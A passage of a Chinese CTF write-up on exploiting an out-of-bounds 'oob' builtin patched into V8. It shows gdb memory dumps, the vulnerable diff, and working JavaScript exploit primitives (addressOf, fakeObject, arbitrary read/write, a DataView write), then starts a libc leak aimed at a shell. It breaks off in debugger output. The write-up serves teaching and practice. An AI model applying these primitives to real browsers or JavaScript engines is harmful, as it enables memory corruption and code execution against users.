(WEAK_FIXED_ARRAY_TYPE)&gt;</span><br><span class="line"> - construction counter: 0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Thread 1 &quot;d8&quot; received signal SIGTRAP, Trace/breakpoint trap.</span><br><span class="line"></span><br><span class="line">gdb-peda$ telescope 0x09fc4aa0dfa8</span><br><span class="line">0000| 0x9fc4aa0dfa8 --&gt; 0x4366f840801 --&gt; 0x4366f8401 </span><br><span class="line">0008| 0x9fc4aa0dfb0 --&gt; 0x200000000 </span><br><span class="line">0016| 0x9fc4aa0dfb8 --&gt; 0x9fc4aa0df29 --&gt; 0x7100003a73fe2c2e </span><br><span class="line">0024| 0x9fc4aa0dfc0 --&gt; 0x9fc4aa0df89 --&gt; 0x7100003a73fe2c2e </span><br><span class="line">0032| 0x9fc4aa0dfc8 --&gt; 0x3a73fe2c2f79 --&gt; 0x4000004366f8401 </span><br><span class="line">0040| 0x9fc4aa0dfd0 --&gt; 0x4366f840c71 --&gt; 0x4366f8408 </span><br><span class="line">0048| 0x9fc4aa0dfd8 --&gt; 0x9fc4aa0dfa9 --&gt; 0x4366f8408 </span><br><span class="line">0056| 0x9fc4aa0dfe0 --&gt; 0x200000000 </span><br><span class="line"></span><br><span class="line">gdb-peda$  set &#123;double&#125; 0x9fc4aa0dfc8 = 0x3a73fe2c2ed9</span><br></pre></td></tr></table></figure>
<p>最后job一下变成了<code>PACKED_ELEMENTS</code>。注意之前我set用的类型是int所以后面失败了，下面的结果是我第二次跑的结果，因此跟上面的地址有出入，懒得再重复一遍了233，</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">0x3f98aecdfc9: [JSArray]</span><br><span class="line"> - map: 0x016507e42f79 &lt;Map(PACKED_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x3be78da51111 &lt;JSArray[0]&gt;</span><br><span class="line"> - elements: 0x03f98aecdfa9 &lt;FixedArray[2]&gt; [PACKED_ELEMENTS]</span><br><span class="line"> - length: 2</span><br><span class="line"> - properties: 0x0c1e92c80c71 &lt;FixedArray[0]&gt; &#123;</span><br><span class="line">    <span class="comment">#length: 0x2dbc933401a9 &lt;AccessorInfo&gt; (const accessor descriptor)</span></span><br><span class="line"> &#125;</span><br><span class="line"> - elements: 0x03f98aecdfa9 &lt;FixedArray[2]&gt; &#123;</span><br><span class="line">           0: 0x03f98aecdf29 &lt;JSArray[4]&gt;</span><br><span class="line">           1: 0x03f98aecdf89 &lt;JSArray[6]&gt;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
<p>所以最后再输出arr[0]，实际输出的是对象的地址。</p>
<h3 id="小结v8对象结构"><a href="#小结v8对象结构" class="headerlink" title="小结v8对象结构"></a>小结v8对象结构</h3><p>通过上述调试过程我们看到一个对象在内存的大致布局如下：<br>map    表明了一个对象的类型对象b为PACKED_DOUBLE_ELEMENTS类型<br>prototype    prototype<br>elements    对象元素<br>length    元素个数<br>properties    属性  </p>
<p>而浮点数组和对象数组又有下面类似的结构(注意其他类型的Array和它相似但不完全相同)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"> elements  ----&gt; +------------------------+</span><br><span class="line">                  |          MAP           +&lt;---------+</span><br><span class="line">                  +------------------------+          |</span><br><span class="line">                  |      element 1         |          |</span><br><span class="line">                  +------------------------+          |</span><br><span class="line">                  |      element 2         |          |</span><br><span class="line">                  |      ......            |          |</span><br><span class="line">                  |      element n         |          |</span><br><span class="line">ArrayObject  ----&gt;-------------------------+          |</span><br><span class="line">                  |      map               |          |</span><br><span class="line">                  +------------------------+          |</span><br><span class="line">                  |      prototype         |          |</span><br><span class="line">                  +------------------------+          |</span><br><span class="line">                  |      elements          |          |</span><br><span class="line">                  |                        +----------+</span><br><span class="line">                  +------------------------+</span><br><span class="line">                  |      length            |</span><br><span class="line">                  +------------------------+</span><br><span class="line">                  |      properties        |</span><br><span class="line">                  +------------------------+</span><br></pre></td></tr></table></figure>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>查看给定的diff文件，开始注册了一个函数oob，内部表示为kArrayOob。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">diff --git a/src/bootstrapper.cc b/src/bootstrapper.cc</span><br><span class="line">index b027d36..ef1002f <span class="number">100644</span></span><br><span class="line">--- a/src/bootstrapper.cc</span><br><span class="line">+++ b/src/bootstrapper.cc</span><br><span class="line">@@ <span class="number">-1668</span>,<span class="number">6</span> +<span class="number">1668</span>,<span class="number">8</span> @@ <span class="function"><span class="keyword">void</span> <span class="title">Genesis::InitializeGlobal</span><span class="params">(Handle&lt;JSGlobalObject&gt; global_object,</span></span></span><br><span class="line"><span class="function"><span class="params">                           Builtins::kArrayPrototypeCopyWithin, <span class="number">2</span>, <span class="literal">false</span>)</span></span>;</span><br><span class="line">     SimpleInstallFunction(isolate_, proto, <span class="string">"fill"</span>,</span><br><span class="line">                           Builtins::kArrayPrototypeFill, <span class="number">1</span>, <span class="literal">false</span>);</span><br><span class="line">+    SimpleInstallFunction(isolate_, proto, <span class="string">"oob"</span>,</span><br><span class="line">+                          Builtins::kArrayOob,<span class="number">2</span>,<span class="literal">false</span>);</span><br><span class="line">     SimpleInstallFunction(isolate_, proto, <span class="string">"find"</span>,</span><br><span class="line">                           Builtins::kArrayPrototypeFind, <span class="number">1</span>, <span class="literal">false</span>);</span><br><span class="line">     SimpleInstallFunction(isolate_, proto, <span class="string">"findIndex"</span>,</span><br><span class="line">diff --git a/src/builtins/builtins-<span class="built_in">array</span>.cc b/src/builtins/builtins-<span class="built_in">array</span>.cc</span><br><span class="line">index <span class="number">8</span>df340e.<span class="number">.9</span>b828ab <span class="number">100644</span></span><br><span class="line">--- a/src/builtins/builtins-<span class="built_in">array</span>.cc</span><br><span class="line">+++ b/src/builtins/builtins-<span class="built_in">array</span>.cc</span><br><span class="line">@@ <span class="number">-361</span>,<span class="number">6</span> +<span class="number">361</span>,<span class="number">27</span> @@ V8_WARN_UNUSED_RESULT Object GenericArrayPush(Isolate* isolate,</span><br><span class="line">   <span class="keyword">return</span> *final_length;</span><br><span class="line"> &#125;</span><br><span class="line"> &#125;  <span class="comment">// namespace</span></span><br></pre></td></tr></table></figure>
<p>之后给出oob函数的具体实现：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">+BUILTIN(ArrayOob)&#123;</span><br><span class="line">+    <span class="keyword">uint32_t</span> len = args.length();</span><br><span class="line">+    <span class="keyword">if</span>(len &gt; <span class="number">2</span>) <span class="keyword">return</span> ReadOnlyRoots(isolate).undefined_value();</span><br><span class="line">+    Handle&lt;JSReceiver&gt; receiver;</span><br><span class="line">+    ASSIGN_RETURN_FAILURE_ON_EXCEPTION(</span><br><span class="line">+            isolate, receiver, Object::ToObject(isolate, args.receiver()));</span><br><span class="line">+    Handle&lt;JSArray&gt; <span class="built_in">array</span> = Handle&lt;JSArray&gt;::cast(receiver);</span><br><span class="line">+    FixedDoubleArray elements = FixedDoubleArray::cast(<span class="built_in">array</span>-&gt;elements());</span><br><span class="line">+    <span class="keyword">uint32_t</span> length = <span class="keyword">static_cast</span>&lt;<span class="keyword">uint32_t</span>&gt;(<span class="built_in">array</span>-&gt;length()-&gt;Number());</span><br><span class="line">+    <span class="keyword">if</span>(len == <span class="number">1</span>)&#123;</span><br><span class="line">+        <span class="comment">//read</span></span><br><span class="line">+        <span class="keyword">return</span> *(isolate-&gt;factory()-&gt;NewNumber(elements.get_scalar(length)));</span><br><span class="line">+    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">+        <span class="comment">//write</span></span><br><span class="line">+        Handle&lt;Object&gt; value;</span><br><span class="line">+        ASSIGN_RETURN_FAILURE_ON_EXCEPTION(</span><br><span class="line">+                isolate, value, Object::ToNumber(isolate, args.at&lt;Object&gt;(<span class="number">1</span>)));</span><br><span class="line">+        elements.<span class="built_in">set</span>(length,value-&gt;Number());</span><br><span class="line">+        <span class="keyword">return</span> ReadOnlyRoots(isolate).undefined_value();</span><br><span class="line">+    &#125;</span><br><span class="line">+&#125;</span><br></pre></td></tr></table></figure>
<p>最后将kArrayOob类型同实现函数关联起来</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">@@ <span class="number">-368</span>,<span class="number">6</span> +<span class="number">368</span>,<span class="number">7</span> @@ <span class="keyword">namespace</span> internal &#123;</span><br><span class="line">   TFJ(ArrayPrototypeFlat, SharedFunctionInfo::kDontAdaptArgumentsSentinel)     \</span><br><span class="line">   <span class="comment">/* https://tc39.github.io/proposal-flatMap/#sec-Array.prototype.flatMap */</span>   \</span><br><span class="line">   TFJ(ArrayPrototypeFlatMap, SharedFunctionInfo::kDontAdaptArgumentsSentinel)  \</span><br><span class="line">+  CPP(ArrayOob)                                                                \</span><br><span class="line">                                                                                \</span><br><span class="line">   <span class="comment">/* ArrayBuffer */</span>                                                            \</span><br><span class="line">   <span class="comment">/* ES #sec-arraybuffer-constructor */</span>                                        \</span><br><span class="line">diff --git a/src/compiler/typer.cc b/src/compiler/typer.cc</span><br><span class="line">index ed1e4a5..c199e3a <span class="number">100644</span></span><br><span class="line">--- a/src/compiler/typer.cc</span><br><span class="line">+++ b/src/compiler/typer.cc</span><br><span class="line">@@ <span class="number">-1680</span>,<span class="number">6</span> +<span class="number">1680</span>,<span class="number">8</span> @@ Type Typer::Visitor::JSCallTyper(Type fun, Typer* t) &#123;</span><br><span class="line">       <span class="keyword">return</span> Type::Receiver();</span><br><span class="line">     <span class="keyword">case</span> Builtins::kArrayUnshift:</span><br><span class="line">       <span class="keyword">return</span> t-&gt;cache_-&gt;kPositiveSafeInteger;</span><br><span class="line">+    <span class="keyword">case</span> Builtins::kArrayOob:</span><br><span class="line">+      <span class="keyword">return</span> Type::Receiver();</span><br><span class="line"> </span><br><span class="line">     <span class="comment">// ArrayBuffer functions.</span></span><br><span class="line">     <span class="keyword">case</span> Builtins::kArrayBufferIsView:</span><br></pre></td></tr></table></figure>
<p>可以看到具体逻辑在第二部分，其增加的函数oob先判断用户输入参数的个数，参数个数为1时，读取arr[length]，否则将用户输入参数的第二个参数赋值给arr[length]，注意上述参数个数为c++中的参数个数。<br>因为c++成员函数的第一个参数一定是this指针，所以上述函数的逻辑是调用oob参数为0时输出arr[length]的内容，否则将第一个参数写入到arr[length]的位置。</p>
<h3 id="oob函数"><a href="#oob函数" class="headerlink" title="oob函数"></a>oob函数</h3><p>脚本如下：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> a = [<span class="number">1.1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>];</span><br><span class="line"><span class="keyword">var</span> data = a.oob()</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"[*] oob return data:"</span> + data.toString());</span><br><span class="line">a.oob(<span class="number">2</span>);</span><br></pre></td></tr></table></figure>
<p>因为我们不能用debug调用oob，又不能在release里用job，所以这里直接分析漏洞，数组的长度为length，元素下标从[0,length-1]，这里可以输出和修改arr[length]为数组越界读写。  </p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>有了这个数组越界漏洞，我们要怎样利用呢？下面就牵扯到类型混淆(type confusion)漏洞。根据我们刚才的调试可以发现v8解析一个对象的时候是根据其map值来确定对象属性的，在刚才的浮点数数组对象和对象数组对象的对比中，一旦我们成功将对象数组的map修改成浮点数数组的map值，就可以成功让v8以浮点数数组对象的方式对其进行解析，此时我们输出obj_arr[0]本应输出第一个对象的值，修改之后输出的确实其对象地址，达到读取对象地址的目的。<br>同样的，如果我们想将一块内存地址以对象的形式解析，我们可以将这个地址放到float_arr里，再将float_arr的map改成对象数组的map，即可让原本是浮点数元素的这个内存地址以对象的形式被解析。也就是说我们可以伪造一个对象。  </p>
<h2 id="编写addressOf和fakeObject"><a href="#编写addressOf和fakeObject" class="headerlink" title="编写addressOf和fakeObject"></a>编写addressOf和fakeObject</h2><p>首先定义两个全局的Float数组和对象数组，利用oob函数泄露两个数组的Map类型:<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123;<span class="string">"a"</span>: <span class="number">1</span>&#125;;</span><br><span class="line"><span class="keyword">var</span> obj_array = [obj];</span><br><span class="line"><span class="keyword">var</span> float_array = [<span class="number">1.1</span>];</span><br><span class="line">​</span><br><span class="line"><span class="keyword">var</span> obj_array_map = obj_array.oob();</span><br><span class="line"><span class="keyword">var</span> float_array_map = float_array.oob();</span><br></pre></td></tr></table></figure></p>
<p>下面实现两个函数</p>
<p><code>addressOf</code>泄露给定对象的地址，其中f2i是float2int，1n表示BigNumber</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">addressOf</span>(<span class="params">obj</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    obj_arr[<span class="number">0</span>] = obj;</span><br><span class="line">    obj_arr.oob(float_array_map);<span class="comment">//convert to float_arr</span></span><br><span class="line">    <span class="keyword">let</span> obj_addr =  f2i(obj_arr[<span class="number">0</span>]<span class="number">-1n</span>);</span><br><span class="line">    obj_arr.oob(obj_array_map);</span><br><span class="line">    <span class="keyword">return</span> obj_addr;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fakeObject</span>(<span class="params">addr_to_fake</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    float_arr[<span class="number">0</span>] = i2f(addr_to_fake+<span class="number">1n</span>);</span><br><span class="line">    float_arr.oob(obj_array_map);</span><br><span class="line">    <span class="keyword">let</span> fake_obj = float_addr[<span class="number">0</span>];</span><br><span class="line">    float_addr.oob(float_array_map);</span><br><span class="line">    <span class="keyword">return</span> fake_obj;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>编写辅助函数</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> buf =<span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">16</span>);</span><br><span class="line"><span class="keyword">var</span> float64 = <span class="keyword">new</span> <span class="built_in">Float64Array</span>(buf);</span><br><span class="line"><span class="keyword">var</span> bigUint64 = <span class="keyword">new</span> BigUint64Array(buf);</span><br><span class="line"><span class="comment">// 浮点数转换为64位无符号整数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f2i</span>(<span class="params">f</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    float64[<span class="number">0</span>] = f;</span><br><span class="line">    <span class="keyword">return</span> bigUint64[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 64位无符号整数转为浮点数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">i2f</span>(<span class="params">i</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    bigUint64[<span class="number">0</span>] = i;</span><br><span class="line">    <span class="keyword">return</span> float64[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 64位无符号整数转为16进制字节串</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hex</span>(<span class="params">i</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> i.toString(<span class="number">16</span>).padStart(<span class="number">16</span>, <span class="string">"0"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>注意v8会给内存地址+1，所以泄露object地址的时候要将输出结果-1。<br>同样在构造fake_obj的时候内存中存储的地址为addr+1,得到的obj是一个对象，就不必有什么+-操作了。</p>
<h2 id="构造地址任意读写"><a href="#构造地址任意读写" class="headerlink" title="构造地址任意读写"></a>构造地址任意读写</h2><p>有了这俩函数怎么构造地址任意读写呢？下面就得结合上面v8对象内存布局来看：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ArrayObject  ----&gt;-------------------------+          </span><br><span class="line">                  |      map               |          </span><br><span class="line">                  +------------------------+          </span><br><span class="line">                  |      prototype         |          </span><br><span class="line">                  +------------------------+          </span><br><span class="line">                  |      elements 指针      |          </span><br><span class="line">                  |                        +</span><br><span class="line">                  +------------------------+</span><br><span class="line">                  |      length            |</span><br><span class="line">                  +------------------------+</span><br><span class="line">                  |      properties        |</span><br><span class="line">                  +------------------------+</span><br></pre></td></tr></table></figure>
<p>如果我们在一块内存上部署了上述虚假的内存属性，比如map，prototype,elements指针、length、properties属性，我们就可以用fakeObject把这块内存强制伪造成一个数组对象。<br>我们构造的这个对象的elements指针是可以控制的，如果我们将这个指针修改成我们想要访问的内存地址，那后续我们访问这个数组对象的内容，实际上就是访问我们修改后的内存地址指向的内容，这样也就实现了对任意指定地址的内容访问读写效果了。  </p>
<p>下面是具体的构造：</p>
<p>我们首先创建一个float数组对象fake_array，可以用addressOf泄露fake_array对象的地址，然后根据elements对象与fake_object的内存偏移，可以得出elements地址= addressOf(fake_object) - (0x10 + n * 8)(n为元素个数)，而elements+0x10为实际存储元素的位置。<br>我们提前将fake_object构造为如下的形式：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> fake_array = [</span><br><span class="line">    float_array_map,<span class="comment">//fake to be a float arr object</span></span><br><span class="line">    i2f(<span class="number">0n</span>),</span><br><span class="line">    i2f(<span class="number">0x41414141n</span>),<span class="comment">//fake obj's elements ptr</span></span><br><span class="line">    i2f(<span class="number">0x1000000000n</span>),</span><br><span class="line">    <span class="number">1.1</span>,</span><br><span class="line">    <span class="number">2.2</span></span><br><span class="line">];</span><br></pre></td></tr></table></figure>
<p>则我们可以通过addressOf(fake_array)-0x30计算得到存储数组元素内容的地址，然后使用fakeObject将这个地址转换为对象fake_obj，之后我们访问fake_obj[0]，实际上访问的就是0x41414141+0x10的内容(注意实际的元素存储在elements+0x10处)。<br>下面是地址任意读写的实现：<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> fake_array = [</span><br><span class="line">    float_array_map,</span><br><span class="line">    i2f(<span class="number">0n</span>),</span><br><span class="line">    i2f(<span class="number">0x41414141n</span>),<span class="comment">//fake obj's elements ptr</span></span><br><span class="line">    i2f(<span class="number">0x1000000000n</span>),</span><br><span class="line">    <span class="number">1.1</span>,</span><br><span class="line">    <span class="number">2.2</span></span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> fake_arr_addr = addressOf(fake_array);</span><br><span class="line"><span class="keyword">var</span> fake_object_addr = fake_arr_addr - <span class="number">0x40n</span> + <span class="number">0x10n</span>;</span><br><span class="line"><span class="keyword">var</span> fake_object = fakeObject(fake_object_addr);</span><br><span class="line"></span><br><span class="line"><span class="comment">//randomRead</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">read64</span>(<span class="params">addr</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    fake_array[<span class="number">2</span>] = i2f(addr - <span class="number">0x10n</span> + <span class="number">0x1n</span>);</span><br><span class="line">    <span class="keyword">let</span> leak_data = f2i(fake_object[<span class="number">0</span>]);</span><br><span class="line">    <span class="comment">//console.log("[*] leak from: 0x" +hex(addr) + ": 0x" + hex(leak_data));</span></span><br><span class="line">    <span class="keyword">return</span> leak_data;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">write64</span>(<span class="params">addr,data</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    fake_array[<span class="number">2</span>] = i2f(addr - <span class="number">0x10n</span> + <span class="number">0x1n</span>);</span><br><span class="line">    fake_object[<span class="number">0</span>] = i2f(data);</span><br><span class="line">    <span class="comment">//console.log("[*] write to : 0x" +hex(addr) + ": 0x" + hex(data));</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>测试代码可以发现已经能任意读写。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> a = [<span class="number">1.1</span>,<span class="number">2.2</span>,<span class="number">3.3</span>];</span><br><span class="line">%DebugPrint(a);</span><br><span class="line"><span class="keyword">var</span> a_addr = addressOf(a);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"[*] addressOf a: 0x"</span> + hex(a_addr));</span><br><span class="line"></span><br><span class="line">read64(a_addr);</span><br><span class="line">%SystemBreak();</span><br><span class="line"></span><br><span class="line">write64(a_addr,<span class="number">0x01020304n</span>);</span><br><span class="line">%SystemBreak();</span><br></pre></td></tr></table></figure>
<p>看到已经成功写入了数据</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">0x238dc518f799 &lt;JSArray[3]&gt;</span><br><span class="line">[*] addressOf a: 0x0000238dc518f798</span><br><span class="line"></span><br><span class="line">Thread 1 <span class="string">"d8"</span> received signal SIGTRAP, Trace/breakpoint <span class="built_in">trap</span>.</span><br><span class="line">gdb-peda$ telescope 0x238dc518f798</span><br><span class="line">0000| 0x238dc518f798 --&gt; 0x1020304 </span><br><span class="line">0008| 0x238dc518f7a0 --&gt; 0x3840a5e40c71 --&gt; 0x3840a5e408 </span><br><span class="line">0016| 0x238dc518f7a8 --&gt; 0x238dc518f771 --&gt; 0x3840a5e414 </span><br><span class="line">0024| 0x238dc518f7b0 --&gt; 0x300000000 </span><br><span class="line">0032| 0x238dc518f7b8 --&gt; 0x3840a5e40561 --&gt; 0x200003840a5e401 </span><br><span class="line">0040| 0x238dc518f7c0 --&gt; 0x238dc518f799 --&gt; 0x7100000000010203 </span><br><span class="line">0048| 0x238dc518f7c8 --&gt; 0x3840a5e413b9 --&gt; 0x3840a5e401 </span><br><span class="line">0056| 0x238dc518f7d0 --&gt; 0x2</span><br></pre></td></tr></table></figure>
<p>这里的任意地址写在写高地址的时候会出现问题，地址的低位会被修改出现异常，这里有另一个方式解决这个问题。<br>DataView对象中的backing_store会指向申请的data_buf，修改backing_store为我们想要写的地址，用DataView对象的setBigUint64方法就可以往指定地址写数据了。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> data_buf = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">8</span>);</span><br><span class="line"><span class="keyword">var</span> data_view = <span class="keyword">new</span> <span class="built_in">DataView</span>(data_buf);</span><br><span class="line"><span class="keyword">var</span> buf_backing_store_addr = addressOf(data_buf) + <span class="number">0x20n</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">writeDataview</span>(<span class="params">addr,data</span>)</span>&#123;</span><br><span class="line">    write64(buf_backing_store_addr,addr);</span><br><span class="line">    data_view.setBigUint64(<span class="number">0</span>,data,<span class="literal">true</span>);</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"[*] write to : 0x"</span> +hex(addr) + <span class="string">": 0x"</span> + hex(data));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="正常Pwn题get-shell"><a href="#正常Pwn题get-shell" class="headerlink" title="正常Pwn题get shell"></a>正常Pwn题get shell</h2><p>正常我们获取shell的方法要先泄露libc之后改__free_hook为one_gadget等。<br>这里泄露libc的方式有两种，分别是稳定泄露和不稳定泄露，稳定的方式我试了下也和姚老板一样没整出来(ubuntu 16.04),这里只讲下不稳定泄露。</p>
<p>任意创建一个数组，输出数组地址，往前搜索内存会发现在前面0xd000多的地方有程序的地址，由此可以算出程序基址，之后用got表泄露libc，改__free_hook即可get shell。  </p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> a = [<span class="number">1.1</span>,<span class="number">2.2</span>,<span class="number">3.3</span>];</span><br><span class="line">%DebugPrint(a);</span><br><span class="line">%SystemBreak();</span><br></pre></td></tr></table></figure>
<p>查看d8地址之后搜索，选一个地址比较高的查看一下(exp是写这篇博客前写的，所以当时选的是另一个地址，exp里有出入)<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">0x3a9ed418ddb9 &lt;JSArray[3]&gt;</span><br><span class="line"></span><br><span class="line">Thread 1 <span class="string">"d8"</span> received signal SIGTRAP, Trace/breakpoint <span class="built_in">trap</span>.</span><br><span class="line">gdb-peda$ vmmap d8</span><br><span class="line">Start              End                Perm      Name</span><br><span class="line">0x000055df6dd59000 0x000055df6dfec000 r--p      /home/wz/v8/v8/out.gn/x64.release/d8</span><br><span class="line">0x000055df6dfec000 0x000055df6eab4000 r-xp      /home/wz/v8/v8/out.gn/x64.release/d8</span><br><span class="line">0x000055df6eab4000 0x000055df6eaf4000 r--p      /home/wz/v8/v8/out.gn/x64.release/d8</span><br><span class="line">0x000055df6eaf4000 0x000055df6eafe000 rw-p      /home/wz/v8/v8/out.gn/x64.release/d8</span><br><span class="line"></span><br><span class="line">gdb-peda$ find 0x55df6d</span><br><span class="line">Searching <span class="keyword">for</span> <span class="string">'0x55df6d'</span> <span class="keyword">in</span>: None ranges</span><br><span class="line">Found 17809 results, display max 256 items:</span><br><span class="line">mapped : 0x3a9ed418016b --&gt; 0x181f49000055df6d </span><br><span class="line">mapped : 0x3a9ed4180193 --&gt; 0x180b71000055df6d </span><br><span class="line">mapped : 0x3a9ed41801a3 --&gt; 0x180801000055df6d </span><br><span class="line">mapped : 0x3a9ed41802a3 --&gt; 0x180b71000055df6d </span><br><span class="line">mapped : 0x3a9ed41802b3 --&gt; 0x181f49000055df6d </span><br><span class="line">mapped : 0x3a9ed41802db --&gt; 0x180b71000055df6d </span><br><span class="line">mapped : 0x3a9ed41802eb --&gt; 0x181f49000055df6d </span><br><span class="line">mapped : 0x3a9ed4180313 --&gt; 0x180b71000055df6d </span><br><span class="line">mapped : 0x3a9ed4180323 --&gt; 0x181f49000055df6d </span><br><span class="line">mapped : 0x3a9ed4180353 --&gt; 0x180b71000055df6d </span><br><span class="line">mapped : 0x3a9ed4180363 --&gt; 0x181f49000055df6d </span><br><span class="line">mapped : 0x3a9ed418038b --&gt; 0x180b71000055df6d </span><br><span class="line">mapped : 0x3a9ed418039b --&gt; 0x181f49000055df6d </span><br><span class="line">mapped : 0x3a9ed41803c3 --&gt; 0x180b71000055df6d </span><br><span class="line">mapped : 0x3a9ed41803d3 --&gt; 0x180801000055df6d </span><br><span class="line">mapped : 0x3a9ed4180583 --&gt; 0x180b71000055df6d </span><br><span class="line">mapped : 0x3a9ed4180593 --&gt; 0x181f49000055df6d </span><br><span class="line">mapped : 0x3a9ed41805bb --&gt; 0x180b71000055df6d </span><br><span class="line">mapped : 0x3a9ed41805cb --&gt; 0x181f49000055df6d </span><br><span class="line">mapped : 0x3a9ed418061b --&gt; 0x180b71000055df6d </span><br><span class="line">mapped : 0x3a9ed418062b --&gt; 0x180801000055df6d </span><br><span class="line">mapped : 0x3a9ed4180733 --&gt; 0x180b71000055df6d </span><br><span class="line">mapped : 0x3a9ed4180743 --&gt; 0x181f49000055df6d </span><br><span class="line">mapped : 0x3a9ed418076b --&gt; 0x180b71000055df6d </span><br><span class="line">--More--(25/257)j</span><br><span class="line">mapped : 0x3a9ed418077b --&gt; 0x181f49000055df6d </span><br><span class="line">mapped : 0x3a9ed41807a3 --&gt; 0x180b71000055df6d </span><br><span class="line">mapped : 0x3a9ed41807b3 --&gt; 0x180941000055df6d </span><br><span class="line">mapped : 0x3a9ed41807f3 --&gt; 0x180b71000055df6d </span><br><span class="line">mapped : 0x3a9ed4180803 --&gt; 0x180801000055df6d </span><br><span class="line">mapped : 0x3a9ed4180903 --&gt; 0x180b71000055df6d </span><br><span class="line">mapped : 0x3a9ed4180913 --&gt; 0x181f49000055df6d </span><br><span class="line">mapped : 0x3a9ed418093b --&gt; 0x180b71000055df6d </span><br><span class="line">mapped : 0x3a9ed418094b --&gt; 0x181f49000055df6d </span><br><span class="line">mapped : 0x3a9ed4180973 --&gt; 0x180b71000055df6d </span><br><span class="line">mapped : 0x3a9ed4180983 --&gt; 0x181f49000055df6d </span><br><span class="line">mapped : 0x3a9ed41809c3 --&gt; 0x180b71000055df6d </span><br><span class="line">mapped : 0x3a9ed41809d3 --&gt; 0x181f49000055df6d </span><br><span class="line">mapped : 0x3a9ed41809fb --&gt; 0x180b71000055df6d </span><br><span class="line">mapped : 0x3a9ed4180a0b --&gt; 0x181f49000055df6d </span><br><span class="line">mapped : 0x3a9ed4180a3b --&gt; 0x180b71000055df6d </span><br><span class="line">mapped : 0x3a9ed4180a4b --&gt; 0x180801000055df6d </span><br><span class="line">mapped : 0x3a9ed4180bf3 --&gt; 0x180b71000055df6d </span><br><span class="line">mapped : 0x3a9ed4180c03 --&gt; 0x181f49000055df6d </span><br><span class="line">mapped : 0x3a9ed4180c2b --&gt; 0x180b71000055df6d </span><br><span class="line">mapped : 0x3a9ed4180c3b --&gt; 0x181f49000055df6d </span><br><span class="line">mapped : 0x3a9ed4180c63 --&gt; 0x180b71000055df6d </span><br><span class="line">mapped : 0x3a9ed4180c73 --&gt; 0x181f49000055df6d </span><br><span class="line">mapped : 0x3a9ed4180c9b --&gt; 0x180b71000055df6d </span><br><span class="line">mapped : 0x3a9ed4180cab --&gt; 0x180b71000055df6d </span><br><span class="line">--More--(50/257)</span><br><span class="line">mapped : 0x3a9ed4180cbb --&gt; 0x180801000055df6d </span><br><span class="line">mapped : 0x3a9ed4180dab --&gt; 0x180b71000055df6d </span><br><span class="line">mapped : 0x3a9ed4180dbb --&gt; 0x180801000055df6d </span><br><span class="line">mapped : 0x3a9ed4180ec3 --&gt; 0x180b71000055df6d </span><br><span class="line">mapped : 0x3a9ed4180ed3 --&gt; 0x180941000055df6d </span><br><span 